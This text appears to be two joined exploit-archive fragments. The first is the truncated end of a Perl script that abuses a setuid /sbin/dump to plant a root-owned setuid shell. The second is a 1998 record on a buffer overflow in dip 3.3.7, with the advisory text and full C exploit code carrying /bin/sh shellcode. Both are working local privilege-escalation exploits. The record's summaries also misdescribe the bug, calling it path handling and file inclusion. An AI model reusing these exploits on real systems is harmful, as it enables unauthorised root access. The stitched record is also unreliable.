	return 0;
}" ; close(TEMP); system "cc -o shell shell.c" ; unlink "shell.c" ; open(TEMP1, ">hey")|| ERROR("Something went wrong: $!"); printf TEMP1 "#!/bin/sh
chown root shell
chmod 4755 shell" ; close(TEMP1); chmod(0755, "hey"); if ($ARGV[$0] eq "1") { $DUMPER="/sbin/dump" ; if ( -u "$DUMPER" ) { system "export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 /" ; sleep(3); if ( -u "shell" ) { unlink "hey" ; system "./shell" ; } else { unlink "hey" ; unlink "shell" ; print "Something fucked at the last, sorry" ; } } else { unlink "hey" ; unlink "shell" ; printf "Dump is not exploitable on this system
"; } } elsif ($ARGV[$0] eq "2") { $DUMPER="/sbin/dump.static" ; if ( -u "$DUMPER" ) { system "export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 /" ; sleep(3); if ( -u "shell" ) { unlink "hey" ; system "./shell" ; } else { unlink "hey" ; unlink "shell" ; print "Something fucked at the last, sorry" ; } } else { unlink "hey" ; unlink "shell" ; printf "Dump.static is not exploitable on this system
"; } } elsif ($ARGV[$0]

// #<-- Publish Date --># // 1998-05-05 // #<-- Technical Document Summary (TDS) --># // A buffer overflow exists in dip version 3.3.7 on Linux systems where the setuid dip package is installed. The vulnerability stems from an sprintf() function in main.c line 192 that concatenates user-controlled input without proper sanitization. This allows an attacker to inject arbitrary shellcode into memory. The affected component is the dip library, specifically its setuid implementation. // #<-- Layman's Document Summary (LDS) --># // The weakness involves improper handling of user-supplied file paths during buffer allocation and string formatting. An sprintf() call with unsanitized input can be exploited to write beyond allocated memory limits. This enables execution of malicious code on systems running the vulnerable dip library. The exploit leverages a local buffer overflow in the setuid binary. // #<-- Key Words (KW) --># // dip, buffer overflow, setuid, sprintf, local file path, shellcode injection, Linux, CVE-1999-0137, OSVDB-900 // #<-- Related Terms --># // buffer overflow, setuid vulnerability, local file inclusion, command execution, exploit, dip library, security focus, vulnerability classification // #<-- Entities/Attributes --># // Software: dip, Linux, setuid, sprintf, shellcode, get_sp function, nam variable, argv, buf array, NOP sequence, bin/sh // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/86/info A buffer overflow resides in 'dip-3.3.7o' and derived programs. This is a problem only on systems where 'dip' is installed setuid. The culpable code is an 'sprintf()' in line 192 in 'main.c': sprintf(buf, "%s/LCK..%s", _PATH_LOCKD, nam); /* Linux x86 dip 3.3.7p exploit by pr10n */ #include <stdio.h> #define NOP 0x90 /*thanks to hack.co.za*/ char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d" "\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3" "\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0" "\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh"; unsigned long get_sp(void){ __asm__("movl %esp, %eax");} main(int argc, char *argv[]){ char buf[136]; int i; int offset=0,*ptr; long ret; if(argc!=2){ printf("usage: %s offset
",argv[0]); exit(0);} offset=atoi(argv[1]); ret=(get_sp()-offset); for(i=1;i<136;i+=4){ *(long *)&buf[i]=ret;} printf("
using: 0x%x

",ret); for(i=0;i<(sizeof(buf)-strlen(shellcode)-40);i++) buf[i]=NOP; memcpy(buf+i,shellcode,strlen(shellcode)); execl("/usr/sbin/dip","dip","-k","-l",buf,(char *)0); }

